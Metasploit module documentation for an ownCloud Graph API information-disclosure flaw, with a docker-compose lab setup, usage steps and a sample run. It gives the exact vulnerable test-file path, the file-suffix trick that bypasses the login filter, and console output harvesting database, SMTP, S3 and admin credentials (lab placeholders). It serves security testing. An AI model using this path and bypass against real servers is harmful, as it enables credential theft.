## Vulnerable Application

Docker containers of ownCloud compiled after February 2023, with affected Graph API app versions
0.2.0 before 0.2.1 or 0.3.0 before 0.3.1, contain a test file which prints `phpinfo()`
to an unauthenticated user. A post file name must be appended to the URL to bypass the login filter.
Docker may export sensitive environment variables including ownCloud, DB, Redis, SMTP, and S3 credentials,
as well as other host information.

### Docker-Compose Build

Using docker-compose we can build a fairly robust system with plenty of information to pilfer.

Based off of [Ron Bowes Blog Post](https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/)

A list of environment variables is posted [here](https://github.com/owncloud-docker/base/blob/master/ENVIRONMENT.md#environment-variables)

```
version: "3"

services:
  owncloud:
    image: owncloud/server:10.12.1
    container_name: owncloud_server
    restart: always
    ports:
      - 8080:8080
    depends_on:
      - mariadb
      - redis
    environment:
      - OWNCLOUD_DOMAIN=localhost:8080
      - OWNCLOUD_TRUSTED_DOMAINS=localhost
      - OWNCLOUD_DB_TYPE=mysql
      - OWNCLOUD_DB_NAME=owncloud
      - OWNCLOUD_DB_USERNAME=owncloud
      - OWNCLOUD_DB_PASSWORD=owncloud
      - OWNCLOUD_DB_HOST=mariadb
      - OWNCLOUD_ADMIN_USERNAME=admin_username
      - OWNCLOUD_ADMIN_PASSWORD=admin_password
      - OWNCLOUD_MYSQL_UTF8MB4=true
      - OWNCLOUD_REDIS_ENABLED=true
      - OWNCLOUD_REDIS_HOST=redis
      - APACHE_LOG_LEVEL=trace6
      - OWNCLOUD_MAIL_SMTP_PASSWORD=smtp_password
      - OWNCLOUD_MAIL_SMTP_NAME=smtp_username
      - OWNCLOUD_LICENSE_KEY=1122333
      - OWNCLOUD_OBJECTSTORE_KEY=owncloud123456
      - OWNCLOUD_OBJECTSTORE_SECRET=secret123456
      - OWNCLOUD_OBJECTSTORE_REGION=us-east-1
    healthcheck:
      test: ["CMD", "/usr/bin/healthcheck"]
      interval: 30s
      timeout: 10s
      retries: 5

  mariadb:
    image: mariadb:10.11 # minimum required ownCloud version is 10.9
    container_name: owncloud_mariadb
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=owncloud
      - MYSQL_USER=owncloud
      - MYSQL_PASSWORD=owncloud
      - MYSQL_DATABASE=owncloud
      - MARIADB_AUTO_UPGRADE=1
    command: ["--max-allowed-packet=128M", "--innodb-log-file-size=64M"]
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-u", "root", "--password=owncloud"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:6
    container_name: owncloud_redis
    restart: always
    command: ["--databases", "1"]
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 5s
      retries: 5
```

You may need to add an entry to `OWNCLOUD_TRUSTED_DOMAINS` with the host's IP address,
such as `OWNCLOUD_TRUSTED_DOMAINS=localhost,192.0.2.1`.

The pinned 10.12.1 vendor image in the automated lab includes Graph API 0.3.0.
The historical Marketplace installation URL now returns 404. Use the lab's verified
app sources for reproducible version selection. To enable the bundled app:

```
docker exec owncloud_server occ app:enable graphapi
```

### Automated container lab

The [ownCloud acceptance lab](../../../../test/module_targets/owncloud_phpinfo/README.md)
provides serial profiles for the genuine vendor runtime, affected/fixed Graph API
apps, root/subpath deployments and an unrelated HTTP server. It checks native
authentication, exposed environment values, actual loot, database records and
cleanup. Registration alone does not establish a passing result.

## Verification Steps

1. Install the application and plugin
1. Start msfconsole
1. Do: `use auxiliary/gather/owncloud_phpinfo_reader`
1. Do: `set rhost [ip]`
1. Do: `run`
1. You should information from the system configuration

## Options

### ROOT

Root path of the URI, which is ownCloud specific and distinct from `TARGETURI`.
Defaults to `all`, which tries `''` (empty) and `owncloud`.

### ENDFILE

The file path to add to the end of the URL, which is used to bypass filtering. Defaults to `all` which will try `/.css`, `/.js`, `/.svg`,
`/.gif`, `/.png`, `/.html`, `/.ttf`, `/.woff`, `/.ico`, `/.jpg`, `/.jpeg`, `/.json`, `/.properties`, `/.min.map`, `/.js.map`, `/.auto.map`

## Scenarios

### ownCloud 10.12.1 from Docker Compose

```
resource (owncloud.rb)> use auxiliary/gather/owncloud_phpinfo_reader
resource (owncloud.rb)> set rhosts 127.0.0.1
rhosts => 127.0.0.1
resource (owncloud.rb)> set verbose true
verbose => true
resource (owncloud.rb)> run
[*] Running module against 127.0.0.1
[*] Checking: /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css
[+] Found phpinfo page at: /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css
[+] Loot stored to: /home/h00die/.msf4/loot/20231203153109_default_127.0.0.1_owncloud.phpinfo_453632.txt
[+] License Key: 1122333
[+] Hostname: b2b16d6f3ba6
[+] Home: /root
[+] Server Root: /var/www/owncloud
[+] PWD: /var/www/owncloud
[+] SMTP Username: smtp_username
[+] SMTP Password: smtp_password
[+] ownCloud Username: admin_username
[+] ownCloud Password: admin_password
[+] DB Host: mariadb:3306
[+] DB Username: owncloud
[+] DB Password: owncloud
[+] DB Name: owncloud
[+] Redis Host: redis
[+] Redis Port: 6379
[+] Objectstore Endpoint: https://s3.us-east-1.amazonaws.com
[+] Objectstore Region: us-east-1
[+] Objectsore Secret: secret123456
[+] Objectstore Key: owncloud123456
[+] Objectstore Bucket: owncloud
[+] Credentials
===========

  Type             Host            Username             Password              Notes
  ----             ----            --------             --------              -----
  S3 Object Store  us-east-1       Key: owncloud123456  Secret: secret123456  Endpoint: https://s3.us-east-1.amazonaws.com, Bucket: owncloud
  SMTP             127.0.0.1:25    smtp_username        smtp_password
  mysql            127.0.0.1:8080  owncloud             owncloud
  ownCloud         127.0.0.1:8080  admin_username       admin_password

[*] Auxiliary module execution completed
```
